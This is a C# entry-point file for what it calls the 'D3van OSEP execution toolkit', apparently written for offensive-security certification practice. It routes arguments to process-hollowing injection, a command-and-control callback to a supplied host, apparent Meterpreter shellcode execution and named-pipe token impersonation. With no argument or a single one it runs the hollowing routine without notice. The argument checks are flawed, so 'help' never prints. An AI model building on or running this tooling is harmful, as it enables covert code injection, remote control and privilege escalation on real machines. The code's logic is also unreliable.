using System;

namespace Run
{
    public class Code
    {
        public static void Main(string[] args)
        {
            string arg = "";
            if (args.Length > 1)
            {
                arg = args[0];
            }
            else Execution.Func.EvasiveExecution.ProcessHollowingExec();

            if (arg.Equals("help"))
            {
                Console.WriteLine("######### D3van OSEP execution toolkit ##########");
                Console.WriteLine("Argument Needed:");
                Console.WriteLine("~exec~ to call c2 server");
                Console.WriteLine("~hollow~ to exec process hollowing");
                Console.WriteLine("~pipe~ to launch named pipe impersonation");
            }

            if (arg.Equals("exec"))
            {
                if (args.Length > 1)
                    Execution.Func.EvasiveExecution.Prepare(args[1]);
                else
                    Console.WriteLine("host needed");
                return;
            }

            if (arg.Equals("hollow"))
            {
                Console.WriteLine("Executing proc hollow");
                Execution.Func.EvasiveExecution.ProcessHollowingExec();
            }

            if (arg.Equals("metsh"))
            {
                Console.WriteLine("Executing met");
                Execution.Func.EvasiveExecution.MetShc(args[1]);
            }

            if (arg.Equals("pipe"))
            {
                if (args.Length > 1)
                {
                    Execution.Func.NamedPipeImpersonation.CreatePipe(args[1]);
                }                
            }
        }
    }
}